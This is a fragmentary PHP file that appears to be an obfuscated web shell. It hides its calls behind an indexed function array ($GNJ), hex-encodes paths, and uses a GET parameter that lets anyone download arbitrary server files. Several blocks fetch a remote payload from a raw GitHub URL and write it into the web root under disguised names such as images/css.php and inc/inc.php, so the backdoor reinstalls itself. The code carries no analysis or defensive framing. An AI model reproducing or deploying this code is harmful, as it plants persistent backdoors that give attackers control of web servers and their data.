    ...
    if ($GNJ[28]($w) || $GNJ[29]($w)) {
        foreach ($w as $c) {
            $e = $GNJ[14]("\", " / ", $d);
							...
							<td class="x">
								<a class="ajx" href=" ? d = '.hex($e).' & t = '.hex($c).'">'.$GNJ[20]("Y - m - dH : i", $GNJ[21]("$d / $c")).'</a>
							</td>
							<td class="x">
...
<?php
	...
	if(isset($_GET["g"])) {
		...
		header("Content - disposition : attachment;
            filename = \"" . uhex($_GET["g"]) . "\"");
            $GNJ[37](uhex($_GET["g"]));
            }
?><?php
            function http_get($url) {$im = curl_init($url);
            ...
            $text = http_get('https://raw.githubusercontent.com/93599/93/main/incc.txt');
            $open = fopen($check, 'w');
            fwrite($open, $text);
            fclose($open);
 ...
 ";
            ...
            $text2 = http_get('https://raw.githubusercontent.com/93599/93/main/incc.txt');
 ...
 ";
            ...
            $text3 = http_get('https://raw.githubusercontent.com/93599/93/main/incc.txt');
            $op3 = fopen($check3, 'w');
            fwrite($op3, $text3);
            fclose($op3);
            $check6 = $_SERVER['DOCUMENT_ROOT'] . "/images/css.php";
            $text6 = http_get('https://raw.githubusercontent.com/93599/93/main/incc.txt');
            $op6 = fopen($check6, 'w');
            fwrite($op6, $text6);
            fclose($op6);
...
?><?php
            ...
            if ($datasi) {} else {@mkdir("inc");
            $dos = file_get_contents("https://raw.githubusercontent.com/93599/93/main/incc.txt");
            $data = "inc/inc.php";
            @touch("inc/inc.php");
            $ver = @fopen($data, 'w');
            @fwrite($ver, $dos);
